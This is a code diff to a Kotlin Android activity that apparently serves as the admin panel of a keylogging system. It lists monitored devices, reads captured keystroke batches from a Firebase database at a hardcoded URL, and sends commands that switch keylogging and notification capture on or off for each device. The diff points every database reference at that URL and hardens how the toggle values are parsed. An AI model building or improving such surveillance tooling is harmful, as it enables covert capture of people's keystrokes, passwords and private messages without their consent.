@@ -24,6 +24,7 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
+    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
     data class DeviceModel(
         val name: String,
@@ -44,7 +45,7 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView = findViewById(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
-            val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(device.name)
+            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
             if (type == "key") {
                 device.keylogging = newState
                 ref.child("keylogging").setValue(newState)
@@ -62,7 +63,7 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 for (child in snapshot.children) {
@@ -82,13 +83,24 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun listenToDeviceState(deviceName: String) {
-        val cmdRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
+        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
         cmdRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val key = snapshot.child("status").child("keylogging").getValue(Boolean::class.java)
-                    ?: snapshot.child("keylogging").getValue(Boolean::class.java) ?: true
-                val notif = snapshot.child("status").child("notifications").getValue(Boolean::class.java)
-                    ?: snapshot.child("notifications").getValue(Boolean::class.java) ?: true
+                val keyObj = snapshot.child("status").child("keylogging").value
+                    ?: snapshot.child("keylogging").value
+                val key = when (keyObj) {
+                    is Boolean -> keyObj
+                    is String -> keyObj.toBoolean()
+                    else -> true
+                }
+
+                val notifObj = snapshot.child("status").child("notifications").value
+                    ?: snapshot.child("notifications").value
+                val notif = when (notifObj) {
+                    is Boolean -> notifObj
+                    is String -> notifObj.toBoolean()
+                    else -> true
+                }
 
                 val index = deviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
@@ -103,7 +115,7 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun listenToDeviceLogs(deviceName: String) {
-        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName)
+        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val sb = StringBuilder()
